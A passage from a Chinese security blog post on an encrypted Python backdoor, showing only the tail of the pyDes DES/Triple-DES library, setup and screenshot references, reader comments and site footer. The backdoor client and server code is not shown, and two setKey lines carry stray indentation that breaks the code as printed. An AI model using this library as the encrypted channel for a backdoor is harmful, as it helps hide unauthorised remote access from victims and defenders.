        if crypt_type == des.ENCRYPT:
          block = list(map(lambda x, y: x ^ y, block, iv))
          #j = 0
          #while j &lt; len(block):
          #  block[j] = block[j] ^ iv[j]
          #  j += 1

        processed_block = self.__des_crypt(block, crypt_type)

        if crypt_type == des.DECRYPT:
          processed_block = list(map(lambda x, y: x ^ y, processed_block, iv))
          #j = 0
          #while j &lt; len(processed_block):
          #  processed_block[j] = processed_block[j] ^ iv[j]
          #  j += 1
          iv = block
        else:
          iv = processed_block
      else:
        processed_block = self.__des_crypt(block, crypt_type)


      # Add the resulting crypted block to our list
      #d = self.__BitList_to_String(processed_block)
      #result.append(d)
      result.append(self.__BitList_to_String(processed_block))
      #dict[data[i:i+8]] = d
      i += 8

    # print "Lines: %d, cached: %d" % (lines, cached)

    # Return the full crypted string
    if _pythonMajorVersion &lt; 3:
      return ''.join(result)
    else:
      return bytes.fromhex('').join(result)

  def encrypt(self, data, pad=None, padmode=None):
    """encrypt(data, [pad], [padmode]) -&gt; bytes

    data : Bytes to be encrypted
    pad  : Optional argument for encryption padding. Must only be one byte
    padmode : Optional argument for overriding the padding mode.

    The data must be a multiple of 8 bytes and will be encrypted
    with the already specified key. Data does not have to be a
    multiple of 8 bytes if the padding character is supplied, or
    the padmode is set to PAD_PKCS5, as bytes will then added to
    ensure the be padded data is a multiple of 8 bytes.
    """
    data = self._guardAgainstUnicode(data)
    if pad is not None:
      pad = self._guardAgainstUnicode(pad)
    data = self._padData(data, pad, padmode)
    return self.crypt(data, des.ENCRYPT)

  def decrypt(self, data, pad=None, padmode=None):
    """decrypt(data, [pad], [padmode]) -&gt; bytes

    data : Bytes to be encrypted
    pad  : Optional argument for decryption padding. Must only be one byte
    padmode : Optional argument for overriding the padding mode.

    The data must be a multiple of 8 bytes and will be decrypted
    with the already specified key. In PAD_NORMAL mode, if the
    optional padding character is supplied, then the un-encrypted
    data will have the padding characters removed from the end of
    the bytes. This pad removal only occurs on the last 8 bytes of
    the data (last data block). In PAD_PKCS5 mode, the special
    padding end markers will be removed from the data after decrypting.
    """
    data = self._guardAgainstUnicode(data)
    if pad is not None:
      pad = self._guardAgainstUnicode(pad)
    data = self.crypt(data, des.DECRYPT)
    return self._unpadData(data, pad, padmode)



#############################################################################
#         Triple DES            #
#############################################################################
class triple_des(_baseDes):
  """Triple DES encryption/decrytpion class

  This algorithm uses the DES-EDE3 (when a 24 byte key is supplied) or
  the DES-EDE2 (when a 16 byte key is supplied) encryption methods.
  Supports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.

  pyDes.des(key, [mode], [IV])

  key  -&gt; Bytes containing the encryption key, must be either 16 or
          24 bytes long
  mode -&gt; Optional argument for encryption type, can be either pyDes.ECB
    (Electronic Code Book), pyDes.CBC (Cypher Block Chaining)
  IV   -&gt; Optional Initial Value bytes, must be supplied if using CBC mode.
    Must be 8 bytes in length.
  pad  -&gt; Optional argument, set the pad character (PAD_NORMAL) to use
    during all encrypt/decrpt operations done with this instance.
  padmode -&gt; Optional argument, set the padding mode (PAD_NORMAL or
    PAD_PKCS5) to use during all encrypt/decrpt operations done
    with this instance.
  """
  def __init__(self, key, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):
    _baseDes.__init__(self, mode, IV, pad, padmode)
    self.setKey(key)

  def setKey(self, key):
    """Will set the crypting key for this object. Either 16 or 24 bytes long."""
     self.key_size = 24  # Use DES-EDE3 mode
    if len(key) != self.key_size:
      if len(key) == 16: # Use DES-EDE2 mode
        self.key_size = 16
      else:
        raise ValueError("Invalid triple DES key size. Key must be either 16 or 24 bytes long")
     if self.getMode() == CBC:
      if not self.getIV():
        # Use the first 8 bytes of the key
        self._iv = key[:self.block_size]
      if len(self.getIV()) != self.block_size:
        raise ValueError("Invalid IV, must be 8 bytes in length")
    self.__key1 = des(key[:8], self._mode, self._iv,
          self._padding, self._padmode)
    self.__key2 = des(key[8:16], self._mode, self._iv,
          self._padding, self._padmode)
    if self.key_size == 16:
      self.__key3 = self.__key1
    else:
      self.__key3 = des(key[16:], self._mode, self._iv,
            self._padding, self._padmode)
    _baseDes.setKey(self, key)

  # Override setter methods to work on all 3 keys.

  def setMode(self, mode):
    """Sets the type of crypting mode, pyDes.ECB or pyDes.CBC"""
    _baseDes.setMode(self, mode)
    for key in (self.__key1, self.__key2, self.__key3):
      key.setMode(mode)

  def setPadding(self, pad):
    """setPadding() -&gt; bytes of length 1. Padding character."""
    _baseDes.setPadding(self, pad)
    for key in (self.__key1, self.__key2, self.__key3):
      key.setPadding(pad)

  def setPadMode(self, mode):
    """Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5"""
    _baseDes.setPadMode(self, mode)
    for key in (self.__key1, self.__key2, self.__key3):
      key.setPadMode(mode)

  def setIV(self, IV):
    """Will set the Initial Value, used in conjunction with CBC mode"""
    _baseDes.setIV(self, IV)
    for key in (self.__key1, self.__key2, self.__key3):
      key.setIV(IV)

  def encrypt(self, data, pad=None, padmode=None):
    """encrypt(data, [pad], [padmode]) -&gt; bytes

    data : bytes to be encrypted
    pad  : Optional argument for encryption padding. Must only be one byte
    padmode : Optional argument for overriding the padding mode.

    The data must be a multiple of 8 bytes and will be encrypted
    with the already specified key. Data does not have to be a
    multiple of 8 bytes if the padding character is supplied, or
    the padmode is set to PAD_PKCS5, as bytes will then added to
    ensure the be padded data is a multiple of 8 bytes.
    """
    ENCRYPT = des.ENCRYPT
    DECRYPT = des.DECRYPT
    data = self._guardAgainstUnicode(data)
    if pad is not None:
      pad = self._guardAgainstUnicode(pad)
    # Pad the data accordingly.
    data = self._padData(data, pad, padmode)
    if self.getMode() == CBC:
      self.__key1.setIV(self.getIV())
      self.__key2.setIV(self.getIV())
      self.__key3.setIV(self.getIV())
      i = 0
      result = []
      while i &lt; len(data):
        block = self.__key1.crypt(data[i:i+8], ENCRYPT)
        block = self.__key2.crypt(block, DECRYPT)
        block = self.__key3.crypt(block, ENCRYPT)
        self.__key1.setIV(block)
        self.__key2.setIV(block)
        self.__key3.setIV(block)
        result.append(block)
        i += 8
      if _pythonMajorVersion &lt; 3:
        return ''.join(result)
      else:
        return bytes.fromhex('').join(result)
    else:
      data = self.__key1.crypt(data, ENCRYPT)
      data = self.__key2.crypt(data, DECRYPT)
      return self.__key3.crypt(data, ENCRYPT)

  def decrypt(self, data, pad=None, padmode=None):
    """decrypt(data, [pad], [padmode]) -&gt; bytes

    data : bytes to be encrypted
    pad  : Optional argument for decryption padding. Must only be one byte
    padmode : Optional argument for overriding the padding mode.

    The data must be a multiple of 8 bytes and will be decrypted
    with the already specified key. In PAD_NORMAL mode, if the
    optional padding character is supplied, then the un-encrypted
    data will have the padding characters removed from the end of
    the bytes. This pad removal only occurs on the last 8 bytes of
    the data (last data block). In PAD_PKCS5 mode, the special
    padding end markers will be removed from the data after
    decrypting, no pad character is required for PAD_PKCS5.
    """
    ENCRYPT = des.ENCRYPT
    DECRYPT = des.DECRYPT
    data = self._guardAgainstUnicode(data)
    if pad is not None:
      pad = self._guardAgainstUnicode(pad)
    if self.getMode() == CBC:
      self.__key1.setIV(self.getIV())
      self.__key2.setIV(self.getIV())
      self.__key3.setIV(self.getIV())
      i = 0
      result = []
      while i &lt; len(data):
        iv = data[i:i+8]
        block = self.__key3.crypt(iv,    DECRYPT)
        block = self.__key2.crypt(block, ENCRYPT)
        block = self.__key1.crypt(block, DECRYPT)
        self.__key1.setIV(iv)
        self.__key2.setIV(iv)
        self.__key3.setIV(iv)
        result.append(block)
        i += 8
      if _pythonMajorVersion &lt; 3:
        data = ''.join(result)
      else:
        data = bytes.fromhex('').join(result)
    else:
      data = self.__key3.crypt(data, DECRYPT)
      data = self.__key2.crypt(data, ENCRYPT)
      data = self.__key1.crypt(data, DECRYPT)
    return self._unpadData(data, pad, padmode)</pre>
<p style="text-indent:2em;">
	pyDes.py放在client.py同级目录，server同理。
</p>
<p style="text-indent:2em;">
	<img title="python加密通讯后门" alt="python加密通讯后门" src="/file/old/4233_1.jpg" width="499" height="68" />
</p>
<p style="text-indent:2em;">
	<img title="python加密通讯后门" alt="python加密通讯后门" src="/file/old/4234_2.jpg" width="538" height="503" />
</p>
<p style="text-indent:2em;">
	<img title="python加密通讯后门" alt="python加密通讯后门" src="/file/old/4235_3.jpg" width="610" height="709" />
</p>
<p><strong>留言评论（旧系统）：</strong></p>
<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
<blockquote id="6391,4322,118.194.241.126">
<p>佚名 @ 2014-05-13 15:58:31</p>
<p style="text-indent:2em">人之所以会有坏情绪，都是缘于比不过别人，而且又无可奈何。20多年了，第一次这么超然，内心平静。</p>
<p>本站回复：</p>
<p style="text-indent:2em">说得好！此乃真理！若你与世无争，自然逍遥快活~
（亲是不是评错了文章，文不对题啊……）</p>
</blockquote>
<blockquote id="6392,4322,118.194.241.126">
<p>核总牛逼 @ 2014-05-13 16:02:38</p>
<p style="text-indent:2em">没评论错文章~只是想留下脚印，找了个地方就留下了；</p>
<p>本站回复：</p>
<p style="text-indent:2em">Soga~ Welcome~</p>
</blockquote>
<blockquote id="6393,4322,112.192.177.83">
<p>wormfox @ 2014-05-13 16:44:09</p>
<p style="text-indent:2em">Data Encryption Algorithm加Base64编码，要是反编译服务端得到key，密文。。。。</p>
<p>本站回复：</p>
<p style="text-indent:2em">那就不好说啦……</p>
</blockquote>
</div>
    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">冷冷的夜</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
      2014-05-13
      
    </span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">许可协议</span>
    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
  </p>
</div>


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://lcx.cc/tags/python/">Python</a>
          <a href="https://lcx.cc/tags/%E5%90%8E%E9%97%A8/">后门</a>
          <a href="https://lcx.cc/tags/%E5%8A%A0%E5%AF%86/">加密</a>
          <a href="https://lcx.cc/tags/app/">app</a>
          <a href="https://lcx.cc/tags/ascii/">Ascii</a>
          <a href="https://lcx.cc/tags/exp/">EXP</a>
          <a href="https://lcx.cc/tags/html/">Html</a>
          <a href="https://lcx.cc/tags/http/">HTTP</a>
          <a href="https://lcx.cc/tags/ie/">IE</a>
          <a href="https://lcx.cc/tags/ip/">IP</a>
          <a href="https://lcx.cc/tags/net/">Net</a>
          <a href="https://lcx.cc/tags/pos/">POS</a>
          <a href="https://lcx.cc/tags/rat/">Rat</a>
          <a href="https://lcx.cc/tags/sock/">sock</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/4323/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">讨论：因为这次小米信息泄漏事件，总结一下数据泄漏造成的危害</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        
          <a class="next" href="/post/4321/">
            <span class="next-text nav-default">手里Linux服务器若干root权限如何利用</span>
            <span class="prev-text nav-mobile">下一篇</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="linkedin"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="33" height="33">
  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="weibo"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="zhihu"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
</svg>

    </a>
  
    <a href="/" rel="me noopener" class="iconfont"
      title="douban"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
</svg>

    </a>


<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">

  

  <span class="copyright-year">
    &copy;
    
      2010 -
    2025
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        Nuclear'Atk（核攻击）网络安全实验室
        
      </span></span>

  
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>






<script id="baidu_analytics">
  var _hmt = _hmt || [];
  (function() {
    if (window.location.hostname === 'localhost') return;
    var hm = document.createElement("script"); hm.async = true;
    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
  })();
</script>

<script id="baidu_push">
  (function(){
    if (window.location.hostname === 'localhost') return;
    var bp = document.createElement('script'); bp.async = true;
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
  })();
</script>



  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  














  <script src="/js/my.js"></script>


</body>
</html>
